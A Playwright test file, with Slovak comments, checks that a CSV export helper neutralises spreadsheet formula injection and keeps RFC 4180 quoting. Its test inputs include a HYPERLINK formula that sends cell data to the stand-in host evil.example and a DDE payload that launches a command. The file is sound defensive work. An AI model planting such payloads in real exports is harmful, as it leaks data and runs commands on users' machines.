import { test, expect } from "@playwright/test";
import { csvCell, toCsv } from "../lib/csv";

/** CSV export (feature/security): ochrana proti formula injection + zachované RFC 4180 escapovanie. */

test.describe("formula injection", () => {
  [
    '=HYPERLINK("http://evil.example/?x="&A1,"klik")',
    "+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
    "  =1+1",
  ].forEach((evil, i) => {
    test(`#${i + 1} textová bunka ${JSON.stringify(evil)} sa zapíše ako text (s apostrofom)`, () => {
      const cell = csvCell(evil);
      // po odstránení obalových úvodzoviek začína apostrofom, nie vzorcom
      const inner = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
      expect(inner.startsWith("'")).toBe(true);
    });
  });

  test("čísla (aj záporné) sa neupravujú", () => {
    expect(csvCell(-2.5)).toBe("-2.5");
    expect(csvCell(88.4)).toBe("88.4");
    expect(csvCell(0)).toBe("0");
  });

  test("bežný text a dátum sa neupravujú", () => {
    expect(csvCell("Skvelý týždeň")).toBe("Skvelý týždeň");
    expect(csvCell("2026-09-10")).toBe("2026-09-10");
    expect(csvCell(null)).toBe("");
  });
});

test.describe("RFC 4180", () => {
  test("čiarka, úvodzovka a nový riadok sa obalia", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('povedal "ahoj"')).toBe('"povedal ""ahoj"""');
    expect(csvCell("riadok1\nriadok2")).toBe('"riadok1\nriadok2"');
  });

  test("toCsv: hlavička + riadky, oddelené CRLF, s BOM", () => {
    const csv = toCsv(["Dátum", "Poznámka"], [["2026-09-10", "=1+1"]]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv.split("\r\n")).toEqual([csv.split("\r\n")[0], "2026-09-10,'=1+1"]);
  });
});
